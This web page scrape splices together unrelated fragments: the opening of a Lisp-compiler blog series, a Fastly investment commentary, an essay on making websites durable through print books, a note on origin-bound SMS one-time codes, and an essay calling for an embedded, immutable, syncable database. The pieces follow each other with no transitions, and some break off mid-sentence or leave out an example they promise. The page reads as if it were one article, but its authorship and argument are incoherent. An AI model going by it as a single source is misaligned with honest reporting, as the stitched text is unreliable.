August 31, 2020 | https://bernsteinbear.com/blog/compiling-a-lisp-0/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/compiling-a-lisp-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>In my <a href="https://bernsteinbear.com/blog/lisp/">last series</a>, I wrote about building a
Lisp interpreter. This time, we’re going to write a Lisp compiler.</p>

<p>This series is an adaptation of Abdulaziz Ghuloum’s excellent paper <a href="https://bernsteinbear.com/assets/img/11-ghuloum.pdf">An
Incremental Approach to Compiler Construction</a>, with several key differences:</p>

<ul>
  <li>Our implementation is in C, instead of Scheme</li>
  <li>Our implementation generates machine code directly, instead of generating
text assembly</li>
  <li>Our implementation may omit some runtime data structures</li>
</ul>

<p>See <a href="https://github.com/tekknolagi/ghuloum">my implementation</a> for reference,
but note that it may be incomplete and also may look a little bit different
than the compiler detailed in these posts.</p>

<p>You probably have a couple questions, like <em>why Lisp?</em> and <em>why compile
directly to x86-64?</em> and <em>why C?</em> and <em>come on, another Lisp series?</em>, and
those are all very reasonable questions that will be answered in due time.</p>

<p>I want to implement this compiler in another language than Scheme because it
will prevent me from copying too much of the code from the paper. Even though
the paper doesn’t actually contain the source for the whole compiler (most of
it is, after all, left as exercises for the reader), I think I will learn a lot
more when I have to write all of the code by myself. I get to make my own
mistakes and you get to watch me make and fix them in “real” time.</p>

<p>I also don’t want to generate text assembly, but those reasons are a little
different than my reason for choosing another implementation language:</p>

<p>First, I think that would be harder to test: I want to have an in-process unit
test suite that compiles Lisp programs and executes them on-the-fly. Shelling
out to a system assembler like <code>as</code> or <code>nasm</code> would be somewhat error prone.
What if the person building this doesn’t have the assembler I need? Sure, I
could also write a small assembler as part of this compiler, but that’s a lot
of work.  Harder than just generating x86-64 directly, perhaps.</p>

<p>Second, I want to learn more about machine architecture. While <code>add a, b</code> seems
like one machine instruction, it could probably be encoded in 50 different ways
depending on whether <code>a</code> and <code>b</code> are registers, stack locations, other memory
addresses, immediates, which registers they are, etc. Shelling out to an
assembler abstracts a lot of that detail away. I <em>want</em> to get my hands dirty.
Hopefully you do, too.</p>

<p>I chose Lisp because that’s what the Ghuloum paper uses, and because Lisp can
be represented as a small, compact, dynamically typed language. Many
interpreter implementations are under 200 lines. I don’t think this compiler
will be that short, though.</p>

<p>For questions, comments, and suggestions please post on <a href="https://lists.sr.ht/~max/compiling-lisp">this sr.ht
elist</a>. It’s a public inbox that I can
use to discuss and receive patches. I got the idea from <a href="https://nullprogram.com/">Chris
Wellons</a>.</p>

<h3 id="background-knowledge">Background knowledge</h3>

<p>In order to get the most out of this series, I recommend having at least passing
familiarity with the following:</p>

<ul>
  <li>C or a C-like language</li>
  <li>some kind of assembly language</li>
  <li><em>Abstract Syntax Trees</em> and recursive tree traversal</li>
  <li>no particular aversion to parentheses</li>
</ul>

<p>Having the background helps your focus be more on the bigger picture than the
minutia, but it is by no means required. I expect most of this series to be
fairly readable. If it’s not, that’s a bug and you should report it to me.</p>

<h3 id="structure-of-the-series">Structure of the series</h3>

<p>I plan on writing this series in installments where each installment adds a
feature of some kind. Maybe that feature is a new bit of Lisp functionality, or
maybe it’s a refactoring of the compiler, or maybe it’s a compiler
optimization.</p>

<p>For this reason, each post will tend to depend on the code and understanding
from previous posts. As such, I recommend reading the series in order. I’ll
still try to keep the big ideas understandable for those who don’t.</p>

<p>At each stage of the compiler, we should have a battery of tests that ensure
that the features we have already build continue to work as expected.</p>

<p>I plan on adhering to this rough plan:</p>

<ol>
  <li>Compile integers</li>
  <li>Compile other immediate constants (booleans, ASCII characters, the empty
list)</li>
  <li>Compile unary primitives (<code>add1</code>, <code>sub1</code>, <code>integer-&gt;char</code>, <code>char-&gt;integer</code>,
<code>null?</code>, <code>zero?</code>, etc)</li>
  <li>Compile binary primitives (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>=</code>, etc)</li>
  <li>Compile local variables (<code>let</code>-expressions)</li>
  <li>Compile conditional expressions (<code>if</code>-expressions)</li>
  <li>Compile heap allocation (<code>cons</code>, strings, symbols, etc)</li>
  <li>Compile <code>label</code> procedure calls</li>
  <li>Compile closures</li>
  <li>Add tail-call optimization</li>
  <li>Compile complex constants (<code>quote</code>)</li>
  <li>Compile variable assignment (<code>set!</code>)</li>
  <li>Add macro expander</li>
  <li>Add extended forms using macro expander (<code>let*</code>, <code>letrec</code>, etc)</li>
  <li>Add support for libraries and separate compilation</li>
  <li>Compile foreign function calls</li>
  <li>Add error checking to primitives and procedure calls</li>
  <li>Compile variable-arity procedures (aka varargs)</li>
  <li>Compile <code>apply</code></li>
  <li>Add output ports (kind of like <code>FILE*</code>)</li>
  <li>Add <code>write</code>, <code>display</code></li>
  <li>Add input ports</li>
  <li>Add a tokenizer in Lisp</li>
  <li>Add a reader in Lisp</li>
  <li>Add a Lisp interpreter (or compiler) in Lisp</li>
</ol>

<p>With optional add-ons also described in the initial paper:</p>

<ul>
  <li>Big numbers, IEEE754 floats, complex numbers</li>
  <li>User-defined macros</li>
  <li>A module system</li>
  <li>Heap overflow handler and garbage collector</li>
  <li>Stack overflow handler</li>
  <li>Improved code generation</li>
</ul>

<p>And optional add-ons not described in the original paper:</p>

<ul>
  <li>An intermediate representation for optimization</li>
  <li>Generate executables and write them to disk</li>
  <li>An interpreter with optional just-in-time compiler</li>
</ul>

<p>You may have noticed that this is a <em>lot</em> of steps, and there are some steps
that I intend to take but have completely omitted because I want to roll them
into other posts. Things like:</p>

<ul>
  <li>Code generation infrastructure (a writable buffer, <code>mmap</code>/<code>mprotect</code>, etc)</li>
  <li>Compiler data structures (variable environments, label environments, etc)</li>
  <li>Testing infrastructure (unit testing, integration testing)</li>
</ul>

<p>So it’s really actually more work than I listed above. This series may take a
long time. It may take some twisty turns. It may take some shortcuts. But there
is good news: I’ve already written the compiler up to compiling heap allocation
(still working on procedure calls), and even if I don’t finish this series
there is still Ghuloum’s excellent paper to learn from.</p>

<h3><span id="Business_Model"></span>Business Model<span></span></h3>



<p>Like so many high-flying growth companies, Fastly leverages the “buy revenues” business model, which reflects market participants’ <sup data-mfn="2">2</sup><span data-mfn="2"> (a nontrivial number of entrepreneurs, management/boards, and investors)</span> psychology that is dubbed <a aria-label="FOMO (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://www.nasdaq.com/articles/are-we-seeing-a-fomo-rally-2020-04-06" target="_blank">FOMO</a> (“Fear of Missing Out”) and is under-girded by the Fed’s <a aria-label="POMO (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://www.investopedia.com/terms/p/permanent-open-market-operations.asp" target="_blank">POMO</a> (“Fed’s Permanent Open Market Operations”). </p>



<p>We understand this is our environment, so “when in Rome….” Or, in other words, “<a aria-label="don't fight the FED (opens in a new tab)" href="https://www.thebalance.com/what-is-the-meaning-of-dont-fight-the-fed-2466886" target="_blank" rel="noreferrer noopener">don’t fight the FED</a>.”</p>



<h4><span id="Buying_Revenues"></span>Buying Revenues<span></span></h4>



<p>For example, It spent 33% of revenue on sales &amp; marketing in the quarter ending June 2020 (<a aria-label="page 11 (opens in a new tab)" href="https://investors.fastly.com/files/doc_financials/2020/q2/2Q20-Shareholder-Letter.pdf" target="_blank" rel="noreferrer noopener nofollow">page 11</a> of its 2Q 2020 shareholder letter). That’s called buying revenues, Dear Friends.</p>



<figure><blockquote><p>Sales and marketing expenses were $25 million in Q2 2020, representing <strong>33% of revenue</strong>, up from $17 million, or 37% of revenue in Q2 2019. The increase was primarily driven by an increase in headcount and personnel related costs to drive future enterprise customer acquisition growth, as well as to encourage further use of our platform by existing customers.</p><cite>Fastly’s 2Q 2020 shareholder letter</cite></blockquote></figure>







<p>Nevertheless, this market environment as described does reward people and businesses that provide <a href="https://coventryleague.com/blogentary/do-you-need-a-contract-cfo-or-investment-banking-kiosk/" target="_blank" aria-label="services related to M&amp;A (opens in a new tab)" rel="noreferrer noopener">services related to M&amp;A</a> and <a href="https://coventryleague.com/blogentary/refinance-loans-restructure-debt/" target="_blank" aria-label="strategic finance (opens in a new tab)" rel="noreferrer noopener">strategic finance</a>, including Coventry League.</p>

<p id="covid-bump">So, it appears S3 Partners was at least partially correct in that the huge short positions in Fastly late last year contributed to the massive <a href="#fastlystock">run-up in FSLY’s stock price in 2020</a> – in addition to the <strong><a href="#covid-bump">Covid Bump™</a></strong> that we alluded to earlier in this post.</p>

        <p>Web pages are ghosts: they’re like images projected onto a wall. They aren’t durable. If you turn off the projector (i.e. web server), the picture disappears. If you know how to run a projector, and you can keep it running <em>all the time</em>, you can have a web site.</p><p>But as soon as there’s no one to babysit the projector, it eventually gets turned off, and everything you made with it goes away. If the outage is permanent, the disappearance is too. This is happening all the time, as servers fail, or companies are acquired and shut down.<label for="2914955557482844267"></label><span>“When Yahoo! switched off the servers for GeoCities, the Web posting service, on Oct. 27, some 7 million of the Internet’s first websites went dark forever.” <a href="http://content.time.com/time/business/article/0,8599,1936645,00.html">Time Magazine, 9 Nov 2009</a></span></p><p>I think about this a lot. And I’m not even thinking about the fate of the Entire Internet. Just the small sites I care about, the blogs and small publications. It’s sad to think that when their authors are gone, all their writing will eventually disappear. (And don’t tell me about the Internet Archive—that’s just another backup projector, run by volunteers. We have no assurance that it’ll still be running a year or ten years from now.) Then, too, I also think about my own web sites. Babysitting that projector can be a lot of work sometimes. If it’s all going to go up in smoke as soon as I’m unable to work on it anymore, then publishing on the web seems, really, quite futile.</p><p>The obvious contrast is with hard-copies: things written on paper or printed in books. We can still read books and pamphlets printed five hundred years ago, even though the presses that made them have long since been destroyed.</p><p>How can we give the average independent web writer that kind of permanence?</p><figure><label for="97268267117236911">⊕</label><span>From <a href="http://craigmod.com/journal/post_artifact/">Post-Artifact Books and Publishing</a> by Craig Mod (<span>CC</span> License)</span><img src="https://thelocalyarn.com/excursus/secretary/posts/img/post-artifact-full-large.png"></figure><p>When Craig Mod drew this diagram, he was thinking about this issue the other way around. He was focused on traditional print publishing, and how the web would change that process. We started with print books, he said, and by <em>adding digital publishing</em> we can create this much fuller realm of author-reader interaction. It’s a brilliant and well-considered <a href="http://craigmod.com/journal/post_artifact/">piece</a>. It has this flip-side, though, which we web publishers don’t often talk about: <strong>books can be improved by the web, but the web can also be improved by books.</strong> Digital publishing could use more “Immutable Artifacts”, because <strong>artifacts are durable</strong>.</p><p>Of course there’s a reason why, in all our discussion about CMSs, about design, markup, semantics, and programming, we almost never include books. The <em>tools</em> we use don’t even consider book publication, much less integrate it. But they could. And that’s what this website, <a href="https://thelocalyarn.com/excursus/secretary/index.html"><em>Secretary of Foreign Relations</em></a>, is really about.</p><p><span>This site</span> is basically a rough, first-effort experiment in creating a mini-publication that realizes both sides of Craig’s diagram above. It exists simultaneously as a web site <em>and</em> as a printed, bound book—a book that <a href="https://www.amazon.com/dp/152396216X">you can order right now</a> and have delivered to your door.<label for="-906686242337141937"></label><span>This being a basic proof-of-concept, the book’s cover is extremely generic, and the price is set as low as Amazon KDP will allow me to go ($5.38 in this case). At this point, only the content in the <em>Flatland</em> portion of the site is included in the print edition.</span></p><p>What do I mean by “exists simultaneously”? I mean that the production of the printed book is, for the most part, not some separate workflow from the production of the web site. I’m not copying text from the web site and pasting it into InDesign, for example. When I enter the command to generate the HTML files that make up this site, the complete PDF file for the book is generated at the same time, from the same source and by the same software.<label for="-2475282464837853604"></label><span>See more details on the <a href="https://thelocalyarn.com/excursus/secretary/colophon.html">Colophon</a> page and on <a href="https://github.com/otherjoel/try-pollen">the project’s Github repository</a>.</span> I can upload this PDF file to Amazon KDP, who will print a copy for anyone who cares to order it.</p><p>Why a book? Of course anyone can load a web page in their browser and send it to their inkjet printer. But, seriously: no one does that, even for websites they feel quite attached to. Even if they did, and even if the printout looked really nice (very much not the norm for web pages), who wants to save a sheaf of loose papers? A book is the best kind of printed artifact, and with print-on-demand services you can have them made with reasonable quality at a very low cost.</p><p><span>So here’s</span> how this will play out. After I reimplement my other web sites using this system, I’ll be making book editions of those sites available for free to anyone who cares to request a copy<label for="-2781867892142790827"></label><span>This was what I had in mind originally with my <a href="https://thelocalyarn.com/article/the-annual-yarn-2011"><em>Annual Yarn</em> project</a>, which I hope to resume.</span>. This is a win for both sides. The reader gets a permanent, well-designed copy of something they have enjoyed. And <em>I</em> get the satisfaction of knowing those books are out there, being held in various places by people who (at least somewhat) care about them. The point is not to make money selling books, but to sow the writing as far as it can go—even knowing it has very narrow appeal and no market value. It’s a way to write purely for the joy of it, and still know that the work will easily outlive me. My writing will not depend for its continuance on someone maintaining backups and complicated hosting arrangements.</p><p>So much for my own stuff. But my larger, longer-shot hope is that others will start thinking about doing this too: <em>building</em> and <em>making use of</em> tools that integrate print publishing with web publishing. This goes back to the concern I talked about earlier. I don’t want the writing on small, independent sites to disappear. Not only do I want it not to disappear, there’s a good deal of it that I would like to have on my bookshelf. Some of those authors and those sites are gone already.<label for="-3393301825901819575"></label><span>“I don’t know Mark Pilgrim personally. I only know his work and it’s excellent.

The services and technology we need are already sitting there, ready to print those books for us. Supposing we were able to adopt this kind of approach, it’s easy to suppose we could develop a culture of sharing our books with each other. Our writing would be durable again. That would be a lovely thing.</p><p><label for="558553613229387845">⊕</label><span><em>Sonnet</em> by John Keats</span></p><div><pre>When I have fears that I may cease to be<br>  Before my pen has glean’d my teeming brain,<br>Before high-piléd books, in charact’ry,<br>  Hold like rich garners the full ripen’d grain…</pre></div>

          <p>GitHub <a href="https://github.blog/changelog/2020-08-13-phishing-resistant-sms-autofill/">recently announced</a> it was adopting <a href="https://wicg.github.io/sms-one-time-codes/#origin-bound-one-time-codes">a draft standard for the format of SMS one-time passwords</a> (e.g. two-factor authentication codes) to help thwart phishing attacks.</p>
        </div><div>
          <p><strong>SMS Considerations</strong></p>
<p>Before we get to the details it’s important to note that using SMS for one-time passwords is <strong>less secure</strong> than using a dedicated app such as <a href="https://authy.com/">Authy</a> as the approach is susceptible to <a href="https://en.wikipedia.org/wiki/SIM_swap_scam">SIM-swap attacks</a>. They’re also l<strong>ess convenient</strong> – sometimes the messages take a while to arrive and won’t be received at all if the user is out of mobile phone range or has swapped their SIM card while traveling overseas.</p>
<p>That said, one-time passwords via SMS matter – they’re the most common way to deliver 2FA codes because they work with the technology that users already have. Downloading a dedicated app just to manage 2FA codes is beyond many users.</p>
<p><strong>How it Works</strong></p>
<p>The idea behind the standard is a predefined SMS (text message) format that looks like this:</p>

          <p>Some mobile browsers already do this (Safari, for instance) but do so via guesswork and without any guarantee that the one-time password (OTP) you just received belongs to the right site. Without the <code>origin</code>, a phishing site could simply implement the <code>autocomplete="one-time-code"</code> on a bogus site to collect the OTP.</p>
<p><strong>Status of the Standard</strong></p>
<p>This is a draft standard published by Apple and Google earlier this year. Support seems to be growing. <a href="https://github.blog/changelog/2020-08-13-phishing-resistant-sms-autofill/" target="_blank" rel="noopener">GitHub adopted it</a> earlier this month.&nbsp;Draft standards can and do change, so make sure to do an up-to-date assessment before you attempt to implement it. (And, if you haven’t already, consider using an identity provider to handle this concern for you. Designing and building secure authentication is hard to do well and often not what differentiates your app.)</p>

    <p>I watched the talk
“<a href="https://vimeo.com/230142234">Platform as a Reflection of Values: Joyent, Node.js and beyond</a>”
by Bryan Cantrill, and I think he was able to put into words something I already
felt for some time: if there’s no piece of software out there that reflects your
values, it’s time for you to build that software<sup id="fnref:talk-time" role="doc-noteref"><a href="#fn:talk-time">1</a></sup>.</p>

<p>I kind of agree with what he said, because this is already happening to me. I
long for a database with a certain set of values, and for a few years I was just
waiting for someone to finally write it. After watching his talk, Bryan is
saying to me: “time to stop waiting, and start writing it yourself”.</p>

<p>So let me try to give an overview of such database, and go over its values.</p>



<p>I want a database that allows me to create decentralized client-side
applications that can sync data.</p>

<p>The best one-line description I can give right now is:</p>

<blockquote>
  <p>It’s sort of like PouchDB, Git, Datomic, SQLite and Mentat.</p>
</blockquote>

<p>A more descriptive version could be:</p>

<blockquote>
  <p>An embedded, immutable, syncable relational database.</p>
</blockquote>

<p>Let’s go over what I mean by each of those aspects one by one.</p>



<p>I think the server-side database landscape is diverse and mature enough for
my needs (even though I end up choosing SQLite most of the time), and what I’m
after is a database to be embedded on client-side applications itself, be it
desktop, browser, mobile, etc.</p>

<p>The purpose of such database is not to keep some local cache of data in case of
lost connectivity: we have good solutions for that already. It should serve as
the source of truth, and allow the application to work on top of it.</p>

<p><a href="https://sqlite.org/index.html"><strong>SQLite</strong></a> is a great example of that: it is a very powerful
relational database that runs <a href="https://sqlite.org/whentouse.html">almost anywhere</a>. What I miss
from it that SQLite doesn’t provide is the ability to run it on the browser:
even though you could compile it to WebAssembly, <del>it assumes a POSIX filesystem
that would have to be emulated</del><sup id="fnref:posix-sqlite" role="doc-noteref"><a href="#fn:posix-sqlite">2</a></sup>.</p>

<p><a href="https://pouchdb.com/"><strong>PouchDB</strong></a> is another great example: it’s a full reimplementation of
<a href="https://couchdb.apache.org/">CouchDB</a> that targets JavaScript environments, mainly the browser and
Node.js. However I want a tool that can be deployed anywhere, and not limit its
applications to places that already have a JavaScript runtime environment, or
force the developer to bundle a JavaScript runtime environment with their
application. This is true for GTK+ applications, command line programs, Android
apps, etc.</p>

<p><a href="https://github.com/mozilla/mentat"><strong>Mentat</strong></a> was an interesting project, but its reliance on SQLite
makes it inherit most of the downsides (and benefits too) of SQLite itself.</p>

<p>Having such a requirement imposes a different approach to storage: we have to
decouple the knowledge about the intricacies of storage from the usage of
storage itself, so that a module (say query processing) can access storage
through an API without needing to know about its implementation. This allows
the database to target a POSIX filesystems storage API and an IndexedDB storage
API, and make the rest of the code agnostic about storage. PouchDB has such
mechanism (called <a href="https://pouchdb.com/adapters.html">adapters</a>) and Datomic has them too (called
<a href="https://docs.datomic.com/on-prem/storage.html">storage services</a>).</p>

<p>This would allow the database to adapt to where it is embedded: when targeting
the browser the IndexedDB storage API would provide the persistence layer
that the database requires, and similarly the POSIX filesystem storage API would
provide the persistence layer when targeting POSIX systems (like desktops,
mobile, etc.).</p>

<p>But there’s also an extra restriction that comes from by being embedded: it
needs to provide and embeddable artifact, most likely a binary library object
that exposes a C compatible FFI, similar to
<a href="https://www.sqlite.org/amalgamation.html">how SQLite does</a>. Bundling a full runtime environment is
possible, but doesn’t make it a compelling solution for embedding. This rules
out most languages, and leaves us with C, Rust, Zig, and similar options that
can target POSIX systems and WebAssembly.</p>



<p>Being immutable means that only new information is added, no in-place update
ever happens, and nothing is ever deleted.</p>

<p>Having an immutable database presents us with similar trade-offs found in
persistent data structures, like lack of coordination when doing reads, caches
being always coherent, and more usage of space.</p>

<p><a href="https://www.datomic.com/"><strong>Datomic</strong></a> is the go to database example of this: it will only add
information (datoms) and allows you to query them in a multitude of ways. Stuart
Halloway calls it “accumulate-only” over “append-only”<sup id="fnref:accumulate-only" role="doc-noteref"><a href="#fn:accumulate-only">3</a></sup>:</p>

<blockquote>
  <p>It’s accumulate-only, it is not append-only. So append-only, most people when
they say that they’re implying something physical about what happens.</p>
</blockquote>

<p>Also a database can be append-only and overwrite existing information with new
information, by doing clean-ups of “stale” data. I prefer to adopt the
“accumulate-only” naming and approach.</p>

<p><a href="https://git-scm.com/"><strong>Git</strong></a> is another example of this: new commits are always added on top
of the previous data, and it grows by adding commits instead of replacing
existing ones.</p>

<p>Git repositories can only grow in size, and that is not only an acceptable
condition, but also one of the reasons to use it.</p>

<p>All this means that no in-place updates happens on data, and the database will
be much more concerned about how compact and efficiently it stores data than how
fast it does writes to disk. Being embedded, the storage limitation is either a)
how much storage the device has or b) how much storage was designed for the
application to consume. So even though the database could theoretically operate
with hundreds of TBs, a browser page or mobile application wouldn’t have access
to this amount of storage. SQLite even <a href="https://sqlite.org/limits.html">says</a> that it does
support approximately 280 TBs of data, but those limits are untested.</p>

<p>The upside of keeping everything is that you can have historical views of your
data, which is very powerful. This also means that applications should turn this
off when not relevant<sup id="fnref:no-history" role="doc-noteref"><a href="#fn:no-history">4</a></sup>.</p>



<p>This is a frequent topic when talking about offline-first solutions. When
building applications that:</p>

<ul>
  <li>can fully work offline,</li>
  <li>stores data,</li>
  <li>propagates that data to other application instances,</li>
</ul>

<p>then you’ll need a conflict resolution strategy to handle all the situations
where different application instances disagree. Those application instances
could be a desktop and a browser version of the same application, or the same
mobile app in different devices.</p>

<p>A three-way merge seems to be the best approach, on top of which you could add
application specific conflict resolution functions, like:</p>

<ul>
  <li>pick the change with higher timestamp;</li>
  <li>if one change is a delete, pick it;</li>
  <li>present the diff on the screen and allow the user to merge them.</li>
</ul>

<p>Some databases try to make this “easy”, by choosing a strategy for you, but I’ve
found that different applications require different conflict resolution
strategies. Instead, the database should leave this up to the user to decide,
and provide tools for them to do it.</p>

<p><a href="https://en.wikipedia.org/wiki/Merge_(version_control)"><strong>Three-way merges in version control</strong></a> are the best example,
performing automatic merges when possible and asking the user to resolve
conflicts when they appear.</p>

<p>The unit of conflict for a version control system is a line of text. The
database equivalent would probably be a single attribute, not a full entity or a
full row.</p>

<p>Making all the conflict resolution logic be local should allow the database to
have encrypted remotes similar to how <a href="https://spwhitton.name/tech/code/git-remote-gcrypt/">git-remote-gcrypt</a>
adds this functionality to Git. This would enable users to sync the application
data across devices using an untrusted intermediary.</p>



<p>I want the power of relational queries on the client applications.</p>

<p>Most of the arguments against traditional table-oriented relational databases
are related to write performance, but those don’t apply here. The bottlenecks
for client applications usually aren’t write throughput. Nobody is interested in
differentiating between 1 MB/s or 10 MB/s when you’re limited to 500 MB total.</p>

<p>The relational model of the database could either be based on SQL and tables
like in SQLite, or maybe <a href="https://docs.datomic.com/on-prem/query.html">datalog</a> and <a href="https://docs.datomic.com/cloud/whatis/data-model.html#datoms">datoms</a> like in
Datomic.</p>



<p>Now let’s try to translate the aspects above into values, as suggested by Bryan
Cantrill.</p>



<p>Being able to target so many different platforms is a bold goal, and the
embedded nature of the database demands portability to be a core value.</p>



<p>When the local database becomes the source of truth of the application, it must
provide consistency guarantees that enables applications to rely on it.</p>



<p>The database should empower applications to slice and dice the data in any way
it wants to.</p>



<p>Since I can’t find any database that fits these requirements, I’ve finally come
to terms with doing it myself.</p>

<p>It’s probably going to take me a few years to do it, and making it portable
between POSIX and IndexedDB will probably be the biggest challenge. I got myself
a few books on databases to start.</p>

<p>I wonder if I’ll ever be able to get this done.</p>
